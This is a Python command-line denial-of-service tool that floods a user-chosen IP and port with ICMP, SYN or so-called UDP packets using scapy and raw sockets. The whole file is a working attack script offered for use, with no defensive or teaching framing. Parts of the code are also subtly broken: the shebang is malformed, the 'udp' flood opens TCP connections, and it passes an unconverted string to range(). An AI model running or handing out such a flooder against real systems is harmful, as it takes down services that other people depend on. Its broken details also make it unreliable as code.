#/usr/bin/python3
#@ertugrulturan
#pip3 install scapy
import random
import socket
import threading
from scapy.all import *


def main():
    user_input = input("Please select one of the attack type [syn, icmp, udp]: ")
    if user_input == "icmp":
        icmpflood()
    elif user_input == "syn":
        synflood()
    elif user_input == "udp":
        udpflood()
    else:
        print("[ERROR] Select one of the attack type !!!")
        main()


def icmpflood():
    target = destinationIP()
    cycle = input("How many packets do you sent [Press enter for 100]: ")
    if cycle == "":
        cycle = 100

    for x in range (0,int(cycle)):
        send(IP(dst=target)/ICMP())


def synflood():
    target = destinationIP()
    targetPort = destinationPort()
    cycle = input("How many packets do you sent [Press enter for 100]: ")
    if cycle == "":
        cycle = 100

    for x in range(0, int(cycle)):
        send(IP(dst=target)/TCP(dport=targetPort,
                                flags="S",
                                seq=RandShort(),
                                ack=RandShort(),
                                sport=RandShort()))

def udpflood():
	target = destinationIP()
	targetPort = destinationPort()
	cycle = input("Time To Flood [Press enter for 60]: ")
	data = random._urandom(16)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((target,targetPort))
			s.send(data)
			for x in range(cycle):
				s.send(data)
			print(i +" Sent!!!")
		except:
			s.close()
			print("[*] Error")


def destinationIP():
    dstIP = input("IP: ")
    return dstIP


def destinationPort():
    dstPort = input("Port: ")
    return int(dstPort)


main()
